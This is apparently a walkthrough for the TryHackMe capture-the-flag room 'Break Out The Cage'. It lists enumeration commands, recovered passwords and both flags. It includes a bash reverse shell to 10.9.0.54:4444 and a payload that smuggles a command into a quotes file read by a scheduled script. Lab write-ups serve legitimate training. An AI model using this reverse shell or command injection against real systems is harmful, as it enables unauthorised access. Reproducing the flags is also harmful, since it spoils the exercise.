# <div align="center">[Break Out The Cage](https://tryhackme.com/r/room/breakoutthecage1)</div>
<div align="center">Help Cage bring back his acting career and investigate the nefarious goings on of his agent!</div>

<div align="center">
<img src="https://github.com/user-attachments/assets/ed38db2b-132d-4481-91b0-b98251287fd6" height="200"></img>
</div>

## Task 1. Investigate!

Let's find out what his agent is up to....

### What is Weston's password?
```
nmap -sC -sV <IP>
ftp <IP>
ls -la
get dad_tasks
cat dad_tasks | base64 -d
```
```
Mydadisghostrideraintthatcoolnocausehesonfirejokes
```
### What's the user flag?
```
ssh weston@<IP>
weston:Mydadisghostrideraintthatcoolnocausehesonfirejokes
sudo -l
ls -l /usr/bin/bees
sudo /usr/bin/bees 
find / -type f -user cage 2>/dev/null
cat /opt/.dads_scripts/spread_the_quotes.py
cat /opt/.dads_scripts/.files/.quotes
nc -nlvp 4444

cat > /tmp/shell.sh << EOF
#!/bin/bash
bash -i >& /dev/tcp/10.9.0.54/4444 0>&1
EOF

chmod +x /tmp/shell.sh
printf 'anything;/tmp/shell.sh\n' > /opt/.dads_scripts/.files/.quotes
cat Super_Duper_Checklist
```

```
THM{M37AL_0R_P3N_T35T1NG}
```
### What's the root flag?
```
cat email_backup/*
su root
Password: cageisnotalegend
ls -la
cd email_backup
cat email_1
```
```
THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}
```
## Done 😙
